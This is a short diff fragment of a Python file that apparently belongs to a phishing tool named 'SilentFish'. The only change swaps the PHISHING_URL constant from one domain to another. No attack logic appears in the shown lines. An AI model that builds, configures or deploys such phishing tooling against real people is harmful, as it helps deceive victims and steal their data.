@@ -4,7 +4,7 @@ import time
 import requests
 
 # Constants
-PHISHING_URL = "https://coding-funda.vercel.app"
+PHISHING_URL = "https://nysquiz.com"
 TOOL_NAME = "SilentFish"
 DEVELOPER_INFO = "Developed by: Yamman Butt"
 
